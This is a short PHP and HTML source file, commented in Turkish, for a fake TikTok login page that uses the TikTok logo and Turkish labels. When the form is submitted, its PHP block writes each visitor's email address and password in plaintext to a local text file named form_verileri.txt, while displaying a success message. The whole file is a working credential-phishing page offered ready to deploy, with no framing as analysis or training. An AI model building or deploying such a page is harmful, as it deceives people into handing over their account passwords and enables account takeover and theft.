<?php
// Form gönderildiğinde çalışacak PHP kodu
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Form verilerini al
    $username = $_POST['username'];
    $password = $_POST['password'];

    // TXT dosyasına yazılacak veri
    $data = "E-posta Adresi: " . $username . "\nŞifre: " . $password . "\n\n";

    // Dosyaya yazma (varsa ekler, yoksa yeni dosya oluşturur)
    file_put_contents('form_verileri.txt', $data, FILE_APPEND);

    // Başarı mesajı
    $successMessage = "Veriler başarıyla kaydedildi!";
}
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Giriş</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f4;
        }
        .login-container {
            width: 300px;
            padding: 20px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            text-align: center;
            position: relative;
        }
        .logo {
            position: absolute;
            top: -120px;
            left: 50%;
            transform: translateX(-50%);
            width: 180px;
            height: auto;
        }
        h2 {
            margin-top: 40px;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .error-message {
            color: red;
            margin-top: 10px;
            font-size: 14px;
            display: none;
        }
        @media (max-width: 600px) {
            .login-container {
                width: 90%;
            }
            .logo {
                width: 120px;
                top: -100px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="tiktok2023.png" alt="TikTok Logo" class="logo">
        <h2>Giriş Yap</h2>
        
        <!-- Form action'ı PHP dosyasına yönlendirilmiştir -->
        <form id="loginForm" action="index.php" method="POST">
            <input type="text" id="username" name="username" placeholder="E-posta Adresi" required>
            <input type="password" id="password" name="password" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>

        <!-- Başarı mesajı PHP ile gösterilecek -->
        <?php
        if (isset($successMessage)) {
            echo "<p style='color: green;'>$successMessage</p>";
        }
        ?>

        <div id="errorMessage" class="error-message">Kullanıcı adınız veya şifreniz hatalı.</div>
    </div>

</body>
</html>
